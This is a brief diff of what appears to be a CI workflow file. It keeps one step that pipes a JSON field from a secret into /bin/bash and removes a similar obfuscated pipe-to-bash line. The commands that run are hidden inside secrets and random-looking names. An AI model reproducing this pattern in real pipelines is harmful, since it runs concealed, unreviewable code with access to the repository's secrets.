@@ -22,7 +22,6 @@ jobs:
           y3: ${{ secrets.y3 }}
         run: |
           printf '%s' "$y3" | jq -r .fxxz619 | /bin/bash
-          echo $q44108 | jq -r .gs4994 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
